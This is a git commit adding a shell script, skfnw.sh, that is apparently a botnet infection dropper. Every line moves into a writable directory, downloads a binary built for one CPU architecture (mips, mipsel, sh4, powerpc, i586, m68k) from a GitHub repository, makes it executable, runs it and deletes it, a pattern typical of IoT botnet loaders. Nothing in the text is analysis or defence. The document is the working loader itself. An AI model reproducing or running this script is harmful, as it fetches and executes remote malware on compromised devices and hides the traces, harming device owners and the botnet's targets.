b6d6358eaf904d688244a2e0eef1378d5201fe0e
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-22 02:38:03 +0500

    Add files via upload

---
+++ skfnw.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/i586; chmod +x i586; ./i586; rm -rf i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/m68k; chmod +x m68k; ./m68k; rm -rf m68k
